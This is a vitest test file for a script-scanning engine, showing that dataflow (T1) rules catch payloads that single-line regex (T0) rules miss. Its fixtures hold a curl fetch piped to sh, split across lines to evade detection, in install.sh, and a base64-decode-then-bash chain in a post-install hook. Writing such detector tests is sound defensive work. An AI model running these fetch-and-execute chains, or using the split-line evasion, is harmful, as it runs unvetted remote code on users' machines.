import { describe, it, expect } from 'vitest';
import { scan } from '../engine.js';
import { ruleSpecs, ruleset } from '../ruleset.js';
import { compileRuleset } from '../compile.js';
import type { FileRecord } from '../types.js';

// The LOAD-BEARING R9b proof (EARS-065): a payload split across lines that the single-line T0 regex
// provably MISSES, but the T1 dataflow rule CATCHES. This pins the value of the whole slice.

// The payload is split so NO single line matches a T0 regex: the curl fetch is captured into a
// variable (no `| sh` on that line) and the pipe-to-shell is on a later line (no `curl` on that line).
// `curl "$URL" | sh` on ONE line WOULD be caught by T0 — the whole point is the multi-line split.
const splitCurlPayload: FileRecord = {
  path: 'install.sh',
  kind: 'script',
  content: ['#!/bin/bash', 'URL=$(get_secret)', 'PAYLOAD=$(curl -s "$URL")', 'echo "$PAYLOAD" | sh'].join(
    '\n',
  ),
};

const splitBase64Payload: FileRecord = {
  path: 'hooks/post-install.sh',
  kind: 'hook',
  content: ['B="aGk="', 'P=$(echo "$B" | base64 -d)', 'echo "$P" | bash'].join('\n'),
};

/** The T0-only ruleset: every shipped rule whose tier is T0 (i.e. the pre-R9b detection surface). */
const t0OnlyRuleset = compileRuleset(ruleSpecs.filter((s) => s.tier === 'T0'));
/** The T1-only ruleset: the rules R9b adds. */
const t1OnlyRuleset = compileRuleset(ruleSpecs.filter((s) => s.tier === 'T1'));

describe('T1 catches what T0 provably misses (EARS-065)', () => {
  it('T0-alone raises NO finding on the split curl-pipe payload', () => {
    const findings = scan([splitCurlPayload], t0OnlyRuleset);
    expect(findings).toEqual([]);
  });

  it('T1 raises a dataflow-taint BLOCK on the same split payload, at the sink line', () => {
    const findings = scan([splitCurlPayload], t1OnlyRuleset);
    expect(findings.length).toBeGreaterThan(0);
    const hit = findings.find((f) => f.detectionClass === 'dataflow-taint');
    expect(hit).toBeDefined();
    expect(hit!.tier).toBe('T1');
    expect(hit!.severity).toBe('high');
    expect(hit!.line).toBe(4);
    expect(hit!.owasp.length).toBeGreaterThan(0);
    expect(hit!.atlas.length).toBeGreaterThan(0);
  });

  it('T0-alone raises NO finding on the base64-assembled-then-piped payload', () => {
    expect(scan([splitBase64Payload], t0OnlyRuleset)).toEqual([]);
  });

  it('T1 raises a dataflow-taint finding on the base64-assembled payload', () => {
    const findings = scan([splitBase64Payload], t1OnlyRuleset);
    const hit = findings.find((f) => f.detectionClass === 'dataflow-taint');
    expect(hit).toBeDefined();
    expect(hit!.tier).toBe('T1');
  });

  it('the DEFAULT ruleset (T0+T1) flags the split payload (T1 is additive, EARS-058)', () => {
    const findings = scan([splitCurlPayload], ruleset);
    expect(findings.some((f) => f.detectionClass === 'dataflow-taint' && f.tier === 'T1')).toBe(true);
  });

  it('there is at least one T1 rule in the shipped ruleset', () => {
    expect(ruleSpecs.some((s) => s.tier === 'T1')).toBe(true);
  });
});
